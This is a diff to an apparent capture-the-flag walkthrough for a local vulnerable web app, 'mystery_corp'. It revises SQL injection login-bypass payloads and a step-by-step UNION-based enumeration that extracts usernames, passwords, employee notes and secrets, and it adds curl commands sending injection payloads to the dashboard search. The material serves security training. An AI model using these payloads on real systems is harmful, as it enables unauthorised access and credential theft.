@@ -54,30 +54,72 @@ Username: admin
 Password: admin123
 
 # Method 2: SQL Injection
-Username: admin' OR '1'='1'-- 
+Username: ' OR 1=1#
 Password: anything
 
-# Method 3: Union-based injection
-Username: admin' UNION SELECT 1,'admin','admin123','admin',5-- 
-Password: admin123
+# Method 3: Specific user targeting
+Username: detective' OR username='admin'--
+Password: anything
 ```
 
-#### 2.2 Database Enumeration via Search
+#### 2.2 Systematic Database Enumeration (Dashboard Search)
+
+**Step 1: Determine number of columns**
 ```sql
--- Enumerate tables
-' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='mystery_corp'-- 
+-- Test column count
+%' ORDER BY 4#  -- Success (4 columns exist)
+%' ORDER BY 5#  -- Error (only 4 columns)
+```
 
--- Enumerate columns
-' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- 
+**Step 2: Test injection point**
+```sql
+-- Verify UNION injection works
+%' UNION SELECT 'test',NULL,NULL,NULL#
+```
 
--- Extract user data
-' UNION SELECT 1,username,password,role,5 FROM users-- 
+**Step 3: Database information gathering**
+```sql
+-- Get database info
+%' UNION SELECT @@hostname,database(),@@version,NULL#
 
--- Extract employee data (contains flags)
-' UNION SELECT 1,name,department,secret_note,5 FROM employees-- 
+-- Results:
+-- Hostname: [container_hostname]
+-- Database: mystery_corp
+-- Version: MySQL 8.0.x
+```
 
--- Extract secrets (requires admin access)
-' UNION SELECT 1,title,content,access_level,5 FROM secrets-- 
+**Step 4: Enumerate tables**
+```sql
+-- List all tables in current database
+%' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#
+
+-- Expected tables:
+-- users, employees, secrets, flag_submissions, ctf_settings
+```
+
+**Step 5: Enumerate columns**
+```sql
+-- Get columns from users table
+%' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'#
+
+-- Expected columns: id, username, password, role, created_at
+
+-- Get columns from employees table
+%' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='employees'#
+
+-- Expected columns: id, name, department, salary, secret_note, created_at
+```
+
+**Step 6: Extract sensitive data**
+```sql
+-- Extract user credentials
+%' UNION SELECT username,password,role,NULL FROM users#
+
+-- Extract employee data (contains XSS flag)
+%' UNION SELECT name,department,secret_note,NULL FROM employees#
+
+-- Extract secrets (if admin access)
+%' UNION SELECT title,content,access_level,NULL FROM secrets#
 ```
 
 **Flags Found:**
@@ -190,13 +232,14 @@ sqlmap -u "http://localhost:8080/dashboard.php?search=test" -D mystery_corp -T u
 
 ### Web Application Testing
 ```bash
+# Manual SQL injection testing
+curl -X GET "http://localhost:8080/dashboard.php?search=%27%20ORDER%20BY%204%23"
+curl -X GET "http://localhost:8080/dashboard.php?search=%27%20UNION%20SELECT%20%27test%27,NULL,NULL,NULL%23"
+
 # Burp Suite
 # - Intercept requests
-# - Test SQL injection payloads
-# - Analyze responses
-
-# Manual testing with curl
-curl -X GET "http://localhost:8080/dashboard.php?search=' UNION SELECT 1,2,3,4,5-- "
+# - Test systematic SQL injection payloads
+# - Analyze column structure and data extraction
 ```
 
 ## 🎓 Learning Points
